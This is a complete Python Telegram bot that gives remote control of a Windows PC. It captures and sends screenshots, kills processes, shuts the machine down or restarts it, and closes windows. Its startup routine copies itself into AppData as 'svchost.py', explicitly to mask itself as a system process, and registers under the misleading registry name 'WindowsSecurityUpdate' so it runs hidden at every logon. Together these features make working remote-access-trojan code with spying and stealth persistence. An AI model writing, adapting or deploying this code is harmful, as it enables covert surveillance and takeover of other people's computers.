import asyncio
import os
import psutil
import platform
import shutil
import winreg
from io import BytesIO
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from PIL import ImageGrab

# --- НАСТРОЙКИ ---
BOT_TOKEN = "YOUR_TOKEN_BOT" #сюда вставлять токен бота тг
ADMIN_ID = YOUR_ID  # Твой Telegram ID
# -----------------

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

# ==========================================
# 1. СКРИНШОТ
# ==========================================
def take_screenshot() -> BytesIO:
    img = ImageGrab.grab()
    bio = BytesIO()
    img.save(bio, format="PNG")
    bio.seek(0)
    return bio

# ==========================================
# 2. ДИСПЕТЧЕР ЗАДАЧ
# ==========================================
def get_process_list(limit=10) -> str:
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
        try:
            processes.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
    
    text = "📊 **Топ процессов по памяти:**\n\n"
    for p in processes[:limit]:
        text += f"ID: `{p['pid']}` | {p['name']} | {p['memory_percent']:.1f}%\n"
    return text

def kill_process_by_name(name: str) -> str:
    killed = 0
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if name.lower() in proc.info['name'].lower():
                proc.kill()
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    
    if killed > 0:
        return f"✅ Убито процессов: {killed} (по запросу '{name}')"
    return f"❌ Процесс '{name}' не найден."

# ==========================================
# 3. УПРАВЛЕНИЕ ПИТАНИЕМ И ОКНАМИ
# ==========================================
def shutdown_pc():
    os.system("shutdown /s /t 0")

def restart_pc():
    os.system("shutdown /r /t 0")

def close_all_windows():
    """Закрывает все открытые окна (Alt+F4)"""
    try:
        import pyautogui
        # Ждем 1 секунду, чтобы окно Telegram не мешало
        pyautogui.hotkey('alt', 'f4')
        return "✅ Окно закрыто."
    except Exception as e:
        return f"❌ Ошибка: {e}"

def minimize_all():
    """Сворачивает все окна (Win+D)"""
    try:
        import pyautogui
        pyautogui.hotkey('win', 'd')
        return "✅ Все окна свернуты."
    except Exception as e:
        return f"❌ Ошибка: {e}"

# ==========================================
# 4. АВТОЗАГРУЗКА
# ==========================================
def add_to_startup():
    """Копирует скрипт в AppData и прописывает в реестр"""
    try:
        # Путь к текущему файлу
        current_file = os.path.abspath(__file__)
        appdata_path = os.getenv('APPDATA')
        
        # Куда копируем (маскируем под svchost)
        target_file = os.path.join(appdata_path, "svchost.py")
        
        # Если файла нет, копируем
        if not os.path.exists(target_file):
            shutil.copyfile(current_file, target_file)
            
        # Прописываем в реестр (HKCU\...\Run)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, f'pythonw.exe "{target_file}"')
        winreg.CloseKey(key)
        
        return "✅ Бот добавлен в автозагрузку (скопирован в AppData)."
    except Exception as e:
        return f"❌ Ошибка автозагрузки: {e}"

# ==========================================
# КЛАВИАТУРА
# ==========================================
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Скриншот", callback_data="screenshot")],
        [InlineKeyboardButton(text="📋 Процессы", callback_data="proc_list")],
        [InlineKeyboardButton(text="🪟 Свернуть всё", callback_data="minimize")],
        [InlineKeyboardButton(text="❌ Закрыть окно", callback_data="close_window")],
        [InlineKeyboardButton(text="🔄 Перезагрузка", callback_data="restart")],
        [InlineKeyboardButton(text="🛑 Выключить ПК", callback_data="shutdown")],
        [InlineKeyboardButton(text="⚙️ В автозагрузку", callback_data="startup")]
    ])

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещен.")
        return
    await message.answer("🖥 **Панель управления ПК**\nВыбери действие:", reply_markup=get_main_keyboard())

# --- ОБРАБОТЧИКИ КНОПОК ---

@dp.callback_query(F.data == "screenshot")
async def cb_screenshot(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    await callback.answer("Делаю скриншот...")
    try:
        bio = take_screenshot()
        await callback.message.answer_photo(photo=BufferedInputFile(bio.read(), filename="screen.png"))
    except Exception as e:
        await callback.message.answer(f"Ошибка: {e}")

@dp.callback_query(F.data == "proc_list")
async def cb_proc_list(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    proc_text = get_process_list()
    await callback.message.answer(proc_text, parse_mode="Markdown")
    await callback.message.answer("Чтобы убить процесс, напиши:\n`/kill имя_процесса`", parse_mode="Markdown")

@dp.callback_query(F.data == "minimize")
async def cb_minimize(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    result = minimize_all()
    await callback.message.answer(result)

@dp.callback_query(F.data == "close_window")
async def cb_close_window(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    result = close_all_windows()
    await callback.message.answer(result)

@dp.callback_query(F.data == "restart")
async def cb_restart(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    await callback.message.answer("🔄 Перезагружаю ПК через 5 секунд...")
    await asyncio.sleep(5)
    restart_pc()

@dp.callback_query(F.data == "shutdown")
async def cb_shutdown(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    await callback.message.answer("🛑 Выключаю ПК через 5 секунд...")
    await asyncio.sleep(5)
    shutdown_pc()

@dp.callback_query(F.data == "startup")
async def cb_startup(callback: types.CallbackQuery):
    if not is_admin(callback.from_user.id): return
    result = add_to_startup()
    await callback.message.answer(result)

# --- КОМАНДА УБИЙСТВА ПРОЦЕССА ---
@dp.message(Command("kill"))
async def kill_cmd(message: types.Message):
    if not is_admin(message.from_user.id): return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("Использование: `/kill notepad.exe`", parse_mode="Markdown")
        return
    
    result = kill_process_by_name(args[1])
    await message.answer(result)

async def main():
    print("Бот-администратор запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())